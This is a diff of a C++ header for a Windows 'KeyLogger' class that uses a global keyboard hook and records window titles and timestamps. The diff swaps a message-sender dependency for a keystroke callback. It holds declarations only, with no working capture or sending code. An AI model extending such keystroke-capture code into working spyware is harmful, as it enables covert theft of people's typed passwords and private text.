@@ -5,13 +5,14 @@
 #include <Windows.h>
 #include <wil/resource.h>
 
-#include "IMessageSender.h"
 #include "IOperationQueue.h"
+
+using OnKeyLog = std::function<void(const std::string&)>;
 
 class KeyLogger
 {
 public:
-	explicit KeyLogger(IMessageSender* sender);
+	explicit KeyLogger(const OnKeyLog& onKeyLog);
 	~KeyLogger();
 
 private:
@@ -24,14 +25,12 @@ private:
 	static std::string GetWindowPrefix(HWND windowHandle);
 	static std::string FormatDate(std::chrono::system_clock::time_point time);
 
-	void LogKeyboardEvent(const std::string& log) const;
-
 	static std::mutex _instancesLock;
 	static std::vector<KeyLogger*> _instances;
 	static std::unique_ptr<IOperationQueue> _queue;
 	static wil::unique_hhook _hook;
 	static std::string _lastWindowTitle;
 
-	IMessageSender* _sender;
+	OnKeyLog _onKeyLog;
 };
 
